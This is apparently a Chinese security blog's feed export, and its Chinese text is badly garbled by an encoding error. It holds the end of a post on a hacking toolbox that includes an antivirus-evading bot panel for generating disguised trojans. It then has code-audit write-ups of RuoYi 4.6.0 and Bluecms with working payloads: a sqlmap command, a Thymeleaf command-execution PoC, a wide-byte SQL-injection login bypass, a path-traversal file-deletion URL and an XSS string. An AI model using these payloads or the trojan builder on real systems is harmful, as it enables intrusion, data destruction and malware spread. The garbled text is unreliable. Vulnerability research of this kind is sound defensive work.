title="ä¸‰ã€ä¸´æ—¶ç¬”è®°"></a>ä¸‰ã€ä¸´æ—¶ç¬”è®°</h1><p>ç”¨äºå¯¹æŸäº›æ•°æ®çš„ä¸´æ—¶è®°å½•ï¼Œå½“å·¥å…·ç®±å…³é—­ä¹‹åæ•°æ®å°†ä¼šæ¶ˆå¤±ã€‚å¢åŠ äº†æœç´¢å’Œæ›¿æ¢åŠŸèƒ½</p><p><strong>æœç´¢ï¼š</strong>ctrl + f å¯ç”¨æœç´¢åŠŸèƒ½</p><p><img src="/img/Python-Comprehensive-Growth-Toolbox/sousuo.png" alt="image-20240811235232718"></p><p><strong>æ›¿æ¢ï¼š</strong>ctrl + h å¯åŠ¨æ›¿æ¢åŠŸèƒ½</p><p><img src="/img/Python-Comprehensive-Growth-Toolbox/tihuan.png" alt="image-20240811235411008"></p><h1 id="å››ã€æœ¬åœ°shell"><a href="#å››ã€æœ¬åœ°shell" class="headerlink" title="å››ã€æœ¬åœ°shell"></a>å››ã€æœ¬åœ°shell</h1><p>å¯ä»¥æ‰§è¡Œç®€å•çš„æœ¬åœ°å‘½ä»¤ï¼Œä¸èƒ½è¿›è¡Œäº¤äº’å¼shellï¼ˆå³ä¸èƒ½è¿›è¡Œmysqlè¿æ¥ï¼Œä»¥åŠæ‰§è¡ŒæŸä¸ªæ–‡ä»¶ç­‰ï¼‰</p><p><img src="/img/Python-Comprehensive-Growth-Toolbox/image-20240820231504379.png" alt="image-20240820231504379"></p><h1 id="äº”ã€ChatAIå¯¹è¯æ¨¡å‹"><a href="#äº”ã€ChatAIå¯¹è¯æ¨¡å‹" class="headerlink" title="äº”ã€ChatAIå¯¹è¯æ¨¡å‹"></a>äº”ã€ChatAIå¯¹è¯æ¨¡å‹</h1><p>ç›®å‰ChatAIæ”¯æŒçš„æ¨¡å‹æœ‰kimiã€é€šä¹‰åƒé—®ã€deepseek_api å’Œ ollama ï¼Œåœ¨æœªæ¥å¯èƒ½æ”¯æŒæ›´å¤šçš„å¯¹è¯æ¨¡å‹ã€‚</p><p><img src="/img/Python-Comprehensive-Growth-Toolbox/image-20240929214330556.png" alt="image-20240929214330556"></p><p>2024&#x2F;12&#x2F;18 ç°å·²å¢åŠ æ”¯æŒé€šä¹‰åƒé—®AIæ¨¡å‹é…ç½®ï¼ŒåŒæ—¶å¢åŠ AIåˆ†å±å±•ç¤º</p><p><img src="/img/Python-Comprehensive-Growth-Toolbox/image-20241218212456979.png" alt="image-20241218212456979"></p><p>2025&#x2F;6&#x2F;7 ç°å·²å¢åŠ æ”¯æŒollamaæ¨¡å‹ï¼Œç”±äºollamaå¯ä»¥é›†æˆå¤šç§æ¨¡å‹ï¼Œç›®å‰æš‚ä¸æ”¯æŒé€‰æ‹©æ‰§è¡Œæ¨¡å‹ï¼Œé»˜è®¤ä¸ç¬¬ä¸€ä¸ªæ¨¡å‹è¿›è¡Œäº¤äº’ï¼Œå¦‚æœéœ€è¦ä¿®æ”¹ï¼Œä»…éœ€ä¿®æ”¹ollamaæ¨¡å‹å¯¹è¯çš„æ¨¡å‹ä¸‹æ ‡ã€‚ä½¿ç”¨ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><p><img src="/img/Python-Comprehensive-Growth-Toolbox/image-20250607140525630.png" alt="image-20250607140525630"></p><p>ä½†ç”±äºAIé…ç½®é¡¹å‘ç”Ÿæ”¹å˜ï¼Œéœ€è¦æ‰‹åŠ¨åˆ é™¤ config&#x2F;ai_ask.json æ–‡ä»¶åé‡æ–°é…ç½®æ¨¡å‹APIï¼Œéœ€è¦å®‰è£…é€šä¹‰åƒé—®æ”¯æŒçš„æ¨¡å—</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install -r requests.txt</span><br></pre></td></tr></table></figure><h1 id="å…­ã€è‚‰é¸¡é¢æ¿ï¼ˆè¿‡æ€è½¯ï¼‰"><a href="#å…­ã€è‚‰é¸¡é¢æ¿ï¼ˆè¿‡æ€è½¯ï¼‰" class="headerlink" title="å…­ã€è‚‰é¸¡é¢æ¿ï¼ˆè¿‡æ€è½¯ï¼‰"></a>å…­ã€è‚‰é¸¡é¢æ¿ï¼ˆè¿‡æ€è½¯ï¼‰</h1><p>éœ€è¦é…ç½®æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯</p><h2 id="1ã€æœåŠ¡ç«¯é…ç½®"><a href="#1ã€æœåŠ¡ç«¯é…ç½®" class="headerlink" title="1ã€æœåŠ¡ç«¯é…ç½®"></a>1ã€æœåŠ¡ç«¯é…ç½®</h2><p>å°†æ ¹ç›®å½•ä¸‹çš„server.py æ–‡ä»¶åœ¨æœåŠ¡ç«¯è¿è¡Œå‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 server.py</span><br></pre></td></tr></table></figure><h2 id="2ã€å®¢æˆ·ç«¯é…ç½®"><a href="#2ã€å®¢æˆ·ç«¯é…ç½®" class="headerlink" title="2ã€å®¢æˆ·ç«¯é…ç½®"></a>2ã€å®¢æˆ·ç«¯é…ç½®</h2><p>è¿æ¥IPå’Œç«¯å£ï¼Œåˆ†åˆ«æ˜¯æœåŠ¡ç«¯çš„IPå’Œserver.py çš„å¯åŠ¨ç«¯å£</p><p><img src="/img/Python-Comprehensive-Growth-Toolbox/image-20241010133148704.png" alt="image-20241010133148704"></p><p>æœåŠ¡ç«¯è¿æ¥æˆåŠŸåï¼Œå¯æ‰§è¡Œåé¢çš„ç”Ÿæˆæœ¨é©¬åŠŸèƒ½ã€‚</p><p>æœ¨é©¬é»˜è®¤ä¸ºåŸºæœ¬çš„pyæ–‡ä»¶ï¼Œå¯ä»¥å¯¹åŸºæœ¬çš„pyæ–‡ä»¶ä¼ªè£…åæ‰“åŒ…æˆexeï¼Œåç»­è‡ªè¡Œç ”ç©¶å›¾æ ‡æ›´æ”¹å’Œç­¾åç­‰å†…å®¹</p><h2 id="3ã€æ‰§è¡Œå‘½ä»¤"><a href="#3ã€æ‰§è¡Œå‘½ä»¤" class="headerlink" title="3ã€æ‰§è¡Œå‘½ä»¤"></a>3ã€æ‰§è¡Œå‘½ä»¤</h2><p>å½“è‚‰é¸¡ä¸Šçº¿åï¼Œéœ€è¦å³é”®åˆ·æ–°ä¹‹åï¼Œå¯ä»¥çœ‹åˆ°ä¸Šçº¿ä¿¡æ¯ï¼Œè¿›å…¥å‘½ä»¤åå³å¯åœ¨ä¸‹æ–¹æ‰§è¡Œå‘½ä»¤</p><h1 id="ä¸ƒã€å…¶ä»–é…ç½®"><a href="#ä¸ƒã€å…¶ä»–é…ç½®" class="headerlink" title="ä¸ƒã€å…¶ä»–é…ç½®"></a>ä¸ƒã€å…¶ä»–é…ç½®</h1><h2 id="1ã€è®¾ç½®å¯åŠ¨çª—å£å¤§å°"><a href="#1ã€è®¾ç½®å¯åŠ¨çª—å£å¤§å°" class="headerlink" title="1ã€è®¾ç½®å¯åŠ¨çª—å£å¤§å°"></a>1ã€è®¾ç½®å¯åŠ¨çª—å£å¤§å°</h2><p><img src="/img/Python-Comprehensive-Growth-Toolbox/image-20241204195217345.png" alt="image-20241204195217345"></p><p>æ˜¯ä¾æ®å½“å‰çš„çª—å£å®½åº¦è¿›è¡Œå®æ—¶è°ƒæ•´ã€‚å³ä¼˜å…ˆè°ƒæ•´çª—å£åˆ°åˆé€‚çš„å¤§å°ï¼Œå†å»è®¾ç½®çª—å£å¤§å°ï¼Œä¼šæ˜¾ç¤ºå½“å‰çª—å£çš„å¤§å°é…ç½®ä¿¡æ¯ï¼Œç›´æ¥å¡«å†™å³å¯ã€‚æ–¹ä¾¿å·¥å…·å¤šçš„æƒ…å†µä¸‹å¯¼è‡´çº¿æ¡æˆ–æŒ‰é’®å‡ºæ ¼çš„æƒ…å†µ</p><h2 id="2ã€å·¥å…·åç§°ã€å·¥å…·è·¯å¾„ä¿®æ”¹åŠŸèƒ½"><a href="#2ã€å·¥å…·åç§°ã€å·¥å…·è·¯å¾„ä¿®æ”¹åŠŸèƒ½" class="headerlink" title="2ã€å·¥å…·åç§°ã€å·¥å…·è·¯å¾„ä¿®æ”¹åŠŸèƒ½"></a>2ã€å·¥å…·åç§°ã€å·¥å…·è·¯å¾„ä¿®æ”¹åŠŸèƒ½</h2><p><img src="/img/Python-Comprehensive-Growth-Toolbox/image-20241204195447553.png" alt="image-20241204195447553"></p><p>æ·»åŠ äº†ä¿®æ”¹å·¥å…·åç§°ã€å·¥å…·è·¯å¾„çš„åŠŸèƒ½</p><h1 id="å…«ã€å®‰è£…å’Œä½¿ç”¨"><a href="#å…«ã€å®‰è£…å’Œä½¿ç”¨" class="headerlink" title="å…«ã€å®‰è£…å’Œä½¿ç”¨"></a>å…«ã€å®‰è£…å’Œä½¿ç”¨</h1><p>ä¸‹è½½æˆ–å…‹éš†åpythonæ‰§è¡Œapp.py æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// åœ¨ä½¿ç”¨å‰è¯·å…ˆä¸‹è½½å¿…è¦æ¨¡å—</span><br><span class="line">pip3 install -r requests.txt</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Pythonæ­¦å™¨åº“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pythonæ­¦å™¨åº“ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Javaä»£ç å®¡è®¡ã€‘è‹¥ä¾æ¡†æ¶-4.6.0</title>
      <link href="/2024/11/27/Code-RuoYi-4-6-0/"/>
      <url>/2024/11/27/Code-RuoYi-4-6-0/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€ç¯å¢ƒæ­å»º"><a href="#ä¸€ã€ç¯å¢ƒæ­å»º" class="headerlink" title="ä¸€ã€ç¯å¢ƒæ­å»º"></a>ä¸€ã€ç¯å¢ƒæ­å»º</h1><p>åœ¨å¯¹è‹¥ä¾æ¡†æ¶åšä»£ç å®¡è®¡æ—¶ï¼Œæœ‰å¿…è¦å…ˆå»å­¦ä¹ ä¸€ä¸‹è‹¥ä¾æ¡†æ¶çš„ç»„æˆæ¶æ„ï¼Œåšä¸€ä¸ªå°å‹çš„å¼€å‘é¡¹ç›®å†æ¥ã€‚</p><p>åˆ°å®˜ç½‘ä¸‹è½½å¯¹åº”ç‰ˆæœ¬æºç ï¼š<a href="https://github.com/yangzongzhuan/RuoYi">https://github.com/yangzongzhuan/RuoYi</a></p><p>é‡‡ç”¨5.7ç‰ˆæœ¬Mysqlæ•°æ®åº“ã€‚JDKä½¿ç”¨1.8ç‰ˆæœ¬</p><p><img src="/img/Code-RuoYi-4-6-0/image-20241127055702555.png" alt="image-20241127055702555"></p><p>é…ç½®å¥½æ•°æ®åº“ä¿¡æ¯</p><p><img src="/img/Code-RuoYi-4-6-0/image-20241127055912463.png" alt="image-20241127055912463"></p><p>æ›´æ”¹ç«¯å£å¹¶å¯åŠ¨é¡¹ç›®</p><p><img src="/img/Code-RuoYi-4-6-0/image-20241127061619817.png" alt="image-20241127061619817"></p><h1 id="äºŒã€SQLæ³¨å…¥æ¼æ´ï¼ˆCVE-2023-49371ï¼‰"><a href="#äºŒã€SQLæ³¨å…¥æ¼æ´ï¼ˆCVE-2023-49371ï¼‰" class="headerlink" title="äºŒã€SQLæ³¨å…¥æ¼æ´ï¼ˆCVE-2023-49371ï¼‰"></a>äºŒã€SQLæ³¨å…¥æ¼æ´ï¼ˆCVE-2023-49371ï¼‰</h1><p>è‹¥ä¾æ¡†æ¶é‡‡ç”¨äº†MyBatisçš„å¼€å‘ï¼Œæ‰¾SQLæ³¨å…¥æ—¶å…¨å±€æœç´¢<code>$&#123;</code>ç¬¦å·ï¼Œå°¤å…¶æ˜¯è®¾è®¡åˆ°ç”¨æˆ·çš„è¿™ç§SQLè¯­å¥</p><p><img src="/img/Code-RuoYi-4-6-0/image-20241127060515873.png" alt="image-20241127060515873"></p><p>æ ¹æ®Idå‘ä¸Šå¯»æ‰¾</p><p><img src="/img/Code-RuoYi-4-6-0/image-20241127060639097.png" alt="image-20241127060639097"></p><p>ç›´æ¥å®šä½Controllerå±‚ï¼Œä¸¤å¤„è°ƒç”¨äº†selectRoleList</p><p><img src="/img/Code-RuoYi-4-6-0/image-20241127061001727.png" alt="image-20241127061001727"></p><p>åœ¨å‰ç«¯é¡µå‘èµ·è¯·æ±‚æŸ¥çœ‹æ•°æ®åŒ…</p><p><img src="/img/Code-RuoYi-4-6-0/image-20241127062308069.png" alt="image-20241127062308069"></p><p>å¹¶æ— params.dataScopeå­—æ®µï¼Œæˆ‘ä»¬å°è¯•æ‰‹åŠ¨æ·»åŠ å¹¶ç”¨SQLMap æµ‹è¯•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r test.txt --batch --level 3 --risk 3</span><br></pre></td></tr></table></figure><p><img src="/img/Code-RuoYi-4-6-0/image-20241127063438103.png" alt="image-20241127063438103"></p><p>æµ‹è¯•æˆåŠŸ</p><p><img src="/img/Code-RuoYi-4-6-0/image-20241127063503139.png" alt="image-20241127063503139"></p><h1 id="ä¸‰ã€Shiroååºåˆ—åŒ–æ¼æ´"><a href="#ä¸‰ã€Shiroååºåˆ—åŒ–æ¼æ´" class="headerlink" title="ä¸‰ã€Shiroååºåˆ—åŒ–æ¼æ´"></a>ä¸‰ã€Shiroååºåˆ—åŒ–æ¼æ´</h1><p>æŸ¥çœ‹shiroçš„ç‰ˆæœ¬ä¿¡æ¯ï¼Œ1.7.0ä¸åœ¨Shiro550çš„æ¼æ´èŒƒå›´å†…</p><p><img src="/img/Code-RuoYi-4-6-0/image-20241127063828926.png" alt="image-20241127063828926"></p><p>å…¨å±€æŸ¥æ‰¾cipherKeyï¼Œçœ‹å¯†é’¥æ˜¯å¦æ˜¯å›ºå®šå€¼</p><p><img src="/img/Code-RuoYi-4-6-0/image-20241127064309292.png" alt="image-20241127064309292"></p><p><code>cipherKey å¯†é’¥</code>å›ºå®šä»é…ç½®æ–‡ä»¶ä¸­è·å–</p><p><img src="/img/Code-RuoYi-4-6-0/image-20241127064410247.png" alt="image-20241127064410247"></p><p>è€Œé…ç½®æ–‡ä»¶è¿™é‡Œä½¿ç”¨äº†å›ºå®šçš„å¯†é’¥</p><h1 id="å››ã€Thymeleafæ¨¡æ¿æ³¨å…¥"><a href="#å››ã€Thymeleafæ¨¡æ¿æ³¨å…¥" class="headerlink" title="å››ã€Thymeleafæ¨¡æ¿æ³¨å…¥"></a>å››ã€Thymeleafæ¨¡æ¿æ³¨å…¥</h1><p>å…¨å±€æœç´¢::</p><p><img src="/img/Code-RuoYi-4-6-0/image-20241127071202799.png" alt="image-20241127071202799"></p><p>æ„é€ POC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fragment=__*%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc%22).getInputStream()).next()%7d__::.x</span><br></pre></td></tr></table></figure><p><img src="/img/Code-RuoYi-4-6-0/image-20241127071325977.png" alt="image-20241127071325977"></p>]]></content>
      
      
      <categories>
          
          <category> å¤ç°ä¸å®¡è®¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Javaä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€PHPä»£ç å®¡è®¡ã€‘Bluecmsä»£ç å®¡è®¡</title>
      <link href="/2024/10/30/Code-Audit-PHP-Bluecms/"/>
      <url>/2024/10/30/Code-Audit-PHP-Bluecms/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€å‰ç«¯SQLæ³¨å…¥-ad-js-php"><a href="#ä¸€ã€å‰ç«¯SQLæ³¨å…¥-ad-js-php" class="headerlink" title="ä¸€ã€å‰ç«¯SQLæ³¨å…¥ - ad_js.php"></a>ä¸€ã€å‰ç«¯SQLæ³¨å…¥ - ad_js.php</h1><p>æ¼æ´ç‚¹åœ¨å¦‚ä¸‹ä½ç½®ï¼šæ²¡æœ‰è¿›è¡Œè¿‡æ»¤æˆ–é˜²æŠ¤ç›´æ¥æ‹¼æ¥sqlè¯­å¥</p><p><img src="/img/Code-Audit-PHP-Bluecms/image-20241029211002359.png" alt="image-20241029211002359"></p><p>ä½†æ˜¯åœ¨ä¸Šé¢åŒ…å«æ–‡ä»¶<code>/include/common.inc.php</code>ä¸­ï¼Œå­˜åœ¨å¯¹GETã€POSTã€COOKIEä½¿ç”¨addslashes è¿›è¡Œçš„ç»Ÿä¸€è¿‡æ»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function deep_addslashes($str)&#123;</span><br><span class="line">if(is_array($str))&#123;</span><br><span class="line">foreach($str as $key=&gt;$val)&#123;</span><br><span class="line">$str[$key] = deep_addslashes($val);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">$str = addslashes($str);</span><br><span class="line">&#125;</span><br><span class="line">return $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› æ­¤ï¼Œå•å¼•å·ã€åŒå¼•å·ã€åæ–œæ åœ¨getã€postã€cookieä¸­å°†è¢«è½¬ä¹‰ã€‚</p><p>æ­¤æ—¶çš„ç»•è¿‡æ–¹å¼ä¹Ÿæœ‰å¾ˆå¤šï¼š</p><ol><li>ä½¿ç”¨åå…­è¿›åˆ¶ç¼–ç </li><li>æ­¤cmsä½¿ç”¨äº†gbkç¼–ç ï¼Œé€šè¿‡å®½å­—èŠ‚æ¥ç»•è¿‡</li></ol><p>åœ¨$db-&gt;getone()çš„åº•å±‚ä½¿ç”¨çš„æ˜¯mysql_query</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function query($sql)&#123;</span><br><span class="line">if(!$query=@mysql_query($sql, $this-&gt;linkid))&#123;</span><br><span class="line">$this-&gt;dbshow(&quot;Query error:$sql&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">return $query;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getone($sql, $type=MYSQL_ASSOC)&#123;</span><br><span class="line">$query = $this-&gt;query($sql,$this-&gt;linkid);</span><br><span class="line">$row = mysql_fetch_array($query, $type);</span><br><span class="line">return $row;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="äºŒã€insertå‹SQLæ³¨å…¥"><a href="#äºŒã€insertå‹SQLæ³¨å…¥" class="headerlink" title="äºŒã€insertå‹SQLæ³¨å…¥"></a>äºŒã€insertå‹SQLæ³¨å…¥</h1><p>åœ¨<code>/inlude/common.inc.php</code> ä¸­ï¼Œå‘ç°getã€postã€cookie éƒ½ç»è¿‡äº†addslashes çš„è¿‡æ»¤ï¼Œä½œä¸ºç™½ç›’æµ‹è¯•çš„æˆ‘ä»¬ï¼Œå‘ç°æ•°æ®åº“ä¸­å­˜å‚¨äº†IPçš„ä¿¡æ¯ï¼Œä¼šä¸ä¼šæœ‰å­˜å‚¨IPçš„åœ°æ–¹æ²¡æœ‰ç»è¿‡addslashes çš„è¿‡æ»¤å‘¢ï¼Ÿå…¨å±€æœç´¢ip</p><p><img src="/img/Code-Audit-PHP-Bluecms/image-20241029220853676.png" alt="image-20241029220853676"></p><p>æœç„¶ï¼Œæ‰¾åˆ°ä¸€ä¸ªgetip çš„å‡½æ•°ï¼Œé¡ºç€å¾€ä¸Šæ‰¾</p><p>åœ¨<code>comment.php</code>ä¸­ï¼Œå­˜åœ¨ä¸€ä¸ªinsert çš„SQLè¯­å¥ï¼Œå…¶ä¸­ä½¿ç”¨äº†getip()å‡½æ•°ï¼Œ</p><p><img src="/img/Code-Audit-PHP-Bluecms/image-20241029221309873.png" alt="image-20241029221309873"></p><h1 id="ä¸‰ã€ç”¨æˆ·ç™»é™†SQLæ³¨å…¥"><a href="#ä¸‰ã€ç”¨æˆ·ç™»é™†SQLæ³¨å…¥" class="headerlink" title="ä¸‰ã€ç”¨æˆ·ç™»é™†SQLæ³¨å…¥"></a>ä¸‰ã€ç”¨æˆ·ç™»é™†SQLæ³¨å…¥</h1><p>çœ‹ç”¨æˆ·ç™»é™†çš„<code>user.php</code>çš„<code>$act == &#39;index_login&#39;</code>å†…å®¹ï¼Œç™»é™†æ ¡éªŒåœ¨<code>user.fun.php</code>æ–‡ä»¶ä¸­ï¼Œé‡ç‚¹ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function login($user_name,$pwd)&#123;</span><br><span class="line">$row = $db-&gt;getone(&quot;SELECT COUNT(*) AS num FROM &quot;.table(&#x27;user&#x27;).&quot; WHERE user_name=&#x27;$user_name&#x27;&quot;);</span><br><span class="line">if($row[&#x27;num&#x27;]==0)&#123;</span><br><span class="line">$result = 0;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$sql = &quot;SELECT COUNT(*) AS num FROM &quot;.table(&#x27;user&#x27;).&quot; WHERE user_name=&#x27;$user_name&#x27; and pwd=md5(&#x27;$pwd&#x27;)&quot;;</span><br><span class="line">$user_num = $db-&gt;getone($sql);</span><br><span class="line">if($user_num[&#x27;num&#x27;])&#123;</span><br><span class="line">$result = 1;</span><br><span class="line">&#125;else $result = -1;</span><br><span class="line">&#125;</span><br><span class="line">return $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬çŸ¥é“ç”¨æˆ·åä¹‹åï¼Œåœ¨å¯†ç çš„ä½ç½®å¯ä»¥ä½¿ç”¨ä¸‡èƒ½å¯†ç è¿›è¡Œç™»é™†ï¼Œè¿™é‡Œä½¿ç”¨å®½å­—èŠ‚ç»•è¿‡addslashes å‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user_name=test&amp;pwd=%df&#x27;) or 1=1 %23&amp;x=26&amp;y=8</span><br></pre></td></tr></table></figure><p><img src="/img/Code-Audit-PHP-Bluecms/image-20241030213746125.png" alt="image-20241030213746125"></p><h1 id="å››ã€æ–‡ä»¶åŒ…å«æ¼æ´è‡³Getshell"><a href="#å››ã€æ–‡ä»¶åŒ…å«æ¼æ´è‡³Getshell" class="headerlink" title="å››ã€æ–‡ä»¶åŒ…å«æ¼æ´è‡³Getshell"></a>å››ã€æ–‡ä»¶åŒ…å«æ¼æ´è‡³Getshell</h1><p>åœ¨<code>user.php</code>çš„750è¡Œä¸­ï¼Œå¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">elseif ($act == &#x27;pay&#x27;)&#123;</span><br><span class="line">include &#x27;data/pay.cache.php&#x27;;</span><br><span class="line">$price = $_POST[&#x27;price&#x27;];</span><br><span class="line">$id = $_POST[&#x27;id&#x27;];</span><br><span class="line">$name = $_POST[&#x27;name&#x27;];</span><br><span class="line">if (empty($_POST[&#x27;pay&#x27;])) &#123;</span><br><span class="line">showmsg(&#x27;å¯¹ä¸èµ·ï¼Œæ‚¨æ²¡æœ‰é€‰æ‹©æ”¯ä»˜æ–¹å¼&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">include &#x27;include/payment/&#x27;.$_POST[&#x27;pay&#x27;].&quot;/index.php&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œpostæäº¤çš„pay æ²¡æœ‰è¿›è¡Œä»»ä½•çš„è¿‡æ»¤ï¼Œåˆ™å¯é€šè¿‡ç›®å½•ç©¿è¶Šå’Œæˆªæ–­å®ç°ä»»æ„æ–‡ä»¶åŒ…å«</p><p>å¦‚æœphpç‰ˆæœ¬ä½äº<code>5.3.4</code>ä¸”<code>magic_quotes_gpc=off</code>åˆ™å¯ä»¥ä½¿ç”¨<code>%00</code>æˆªæ–­ã€‚è¿˜å¯ä»¥ä½¿ç”¨ç³»ç»Ÿæ–‡ä»¶è·¯å¾„é•¿åº¦é™åˆ¶æ¥è¿›è¡Œæˆªæ–­</p><p><img src="/img/Code-Audit-PHP-Bluecms/image-20241029225134497.png" alt="image-20241029225134497"></p><p>è¿™é‡Œå·²ç»åŒ…å«äº†æ ¹è·¯å¾„ä¸‹çš„index.php æ–‡ä»¶ï¼Œç°åœ¨æ¥åŒ…å«æ ¹è·¯å¾„ä¸‹çš„1.txtï¼Œä½¿ç”¨ç³»ç»Ÿæ–‡ä»¶è·¯å¾„é•¿åº¦é™åˆ¶æ¥ç»•è¿‡ã€‚è¿™é‡Œä¾ç„¶æœ‰ä¸ªå‰æï¼Œæˆ‘çœ‹å¾ˆå¤šåšå®¢ä¸Šé¢éƒ½æ²¡æœ‰æåˆ°ç³»ç»Ÿæ–‡ä»¶è·¯å¾„é•¿åº¦ç»•è¿‡çš„é™åˆ¶ï¼Œå¯¼è‡´å¤ç°ä¸æˆåŠŸï¼Œè¿™é‡Œçš„phpç‰ˆæœ¬éœ€è¦å°äº5.2.8 </p><p><img src="/img/Code-Audit-PHP-Bluecms/image-20241029233325335.png" alt="image-20241029233325335"></p><p>è¿™æ ·ï¼Œæˆ‘ä»¬å¯ä»¥è”åˆå›¾ç‰‡ä¸Šä¼ æ¥getshell</p><p><img src="/img/Code-Audit-PHP-Bluecms/image-20241029233758459.png" alt="image-20241029233758459"></p><p>æ‰¾åˆ°å›¾ç‰‡ä½ç½®è¿›è¡ŒåŒ…å«å¹¶æ‰§è¡Œå‘½ä»¤</p><p><img src="/img/Code-Audit-PHP-Bluecms/image-20241029234359404.png" alt="image-20241029234359404"></p><h1 id="äº”ã€ä»»æ„æ–‡ä»¶åˆ é™¤"><a href="#äº”ã€ä»»æ„æ–‡ä»¶åˆ é™¤" class="headerlink" title="äº”ã€ä»»æ„æ–‡ä»¶åˆ é™¤"></a>äº”ã€ä»»æ„æ–‡ä»¶åˆ é™¤</h1><p><code>database.php</code>æ–‡ä»¶ä¸­å­˜åœ¨è¯¥æ¼æ´</p><p><img src="/img/Code-Audit-PHP-Bluecms/image-20241029234847190.png" alt="image-20241029234847190"></p><p>å¾ˆæ˜æ˜¾ï¼Œæ¼æ´åŸå› æ˜¯æ²¡æœ‰å¯¹<code>$file_name</code>åšå……è¶³çš„æ ¡éªŒ</p><p>åˆ é™¤å‰æ ¹ç›®å½•</p><p><img src="/img/Code-Audit-PHP-Bluecms/image-20241029235035386.png" alt="image-20241029235035386"></p><p>è®¿é—®ï¼š<code>http://192.168.137.48/bluecms/admin/database.php?act=del&amp;file_name=../../../../../../../../1.txt</code></p><p>åˆ é™¤åæ ¹ç›®å½•</p><p><img src="/img/Code-Audit-PHP-Bluecms/image-20241029235249890.png" alt="image-20241029235249890"></p><h1 id="å…­ã€å­˜å‚¨å‹XSS"><a href="#å…­ã€å­˜å‚¨å‹XSS" class="headerlink" title="å…­ã€å­˜å‚¨å‹XSS"></a>å…­ã€å­˜å‚¨å‹XSS</h1><p>è¿™ä¸ªæœ‰ç‚¹å¤šï¼Œç®€å•åˆ†æä¸€å¤„</p><p>åœ¨<code>user.php</code>æ–°å¢æ–‡ç« è¿™é‡Œ</p><p><img src="/img/Code-Audit-PHP-Bluecms/image-20241029235619966.png" alt="image-20241029235619966"></p><p>ä¸è¿‡è¿™é‡Œä½¿ç”¨äº†ä¸€ä¸ªfilter_data å‡½æ•°åšäº†ä¸€ä¸ªè¿‡æ»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function filter_data($str)</span><br><span class="line">&#123;</span><br><span class="line">$str = preg_replace(&quot;/&lt;(\/?)(script|i?frame|meta|link)(\s*)[^&lt;]*&gt;/&quot;, &quot;&quot;, $str);</span><br><span class="line">return $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™ä¸ªæ­£åˆ™æ˜¯å¯ä»¥ç»•è¿‡çš„ï¼Œå¦‚ä½¿ç”¨imgæ ‡ç­¾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure><h1 id="ä¸ƒã€æ€»ç»“"><a href="#ä¸ƒã€æ€»ç»“" class="headerlink" 